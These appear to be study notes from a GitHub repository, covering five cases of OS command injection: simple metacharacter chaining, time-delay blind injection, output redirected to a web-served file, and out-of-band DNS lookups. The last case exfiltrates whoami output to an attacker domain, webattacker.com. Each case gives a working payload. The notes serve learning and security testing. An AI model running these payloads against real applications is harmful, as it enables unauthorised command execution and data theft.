# There are many instances of OS command injection.

## case 01 --> Simple Case :

Description: 
In this scenario, the attacker tries to perform a simple OS command injection by injecting shell metacharacters such as 
```
|, ;, &&, or || 
```
followed by a system command (e.g., uname -a). These characters are commonly used to chain or execute multiple commands in Unix-like systems.

The attacker can use one of several payload formats to test for command injection, such as:
```
| <command> → e.g., | uname -a

; <command> → e.g., ; whoami

&& <command> → e.g., && id

|| <command> → e.g., || ls
```
```
Payload: | uname -a
```
>This command will print basic system information.

![image](https://github.com/user-attachments/assets/025dc2c1-dbb9-4d9b-b962-2e80b3a62d58)

---

## case 02 --> Blind OS command injection using time delays:
Description :
Blind OS command injection occurs when an attacker injects commands into an application, but the results aren't directly visible. In time-based blind injection, the attacker uses time delays to infer whether a command was successfully executed.
```
Payload: ||ping+-c+20 127.0.0.1||
```
>  This command will cause the application to ping its loopback network adapter for 20 seconds.

![image](https://github.com/user-attachments/assets/5235d08b-7ef2-4de5-a5b7-62fc877fa891)

---

## case 03 --> Blind OS command injection by redirecting output :
Description : 
- Blind OS Command Injection by redirecting the output of a system command to a file within the web application's accessible directory (e.g., /var/www/html/, or any other path exposed on the server).
- Since the application does not return the result of the command directly in the HTTP response, the attacker uses output redirection operators (> or >>) to write the output to a file, and then accesses that file via browser to read the command result.

```
Payload: ||whoami>/var/www/images/output.txt||
```
> The > character sends the output from the whoami command in the specified file. You can then use the application to fetch output.txt to retrieve the file and view the output from the injected command.

![image](https://github.com/user-attachments/assets/40e036c7-74ef-4168-8f3a-a74b64da551e)

![image](https://github.com/user-attachments/assets/e17957d8-b87b-4d26-86e5-bf99ccfa4215)

---

## case 04 --> Blind OS command injection using out-of-band techniques :

```
Payload: ||nslookup+webattacker.com||
```
Description :
The payload uses the nslookup command to cause a DNS lookup for the specified domain.

![image](https://github.com/user-attachments/assets/baae3e0a-7c88-419a-a54b-9ed2edd96596)

---

## case 05 -->  Blind OS command injection with out-of-band data exfiltration :

```
Payload: ||nslookup+`whoami`.webattacker.com||
```

Description: The above payload will cause a DNS lookup to the attacker’s domain containing the result of the whoami command.

![image](https://github.com/user-attachments/assets/b15ecb2b-b709-45f0-a559-5dca419d26e1)
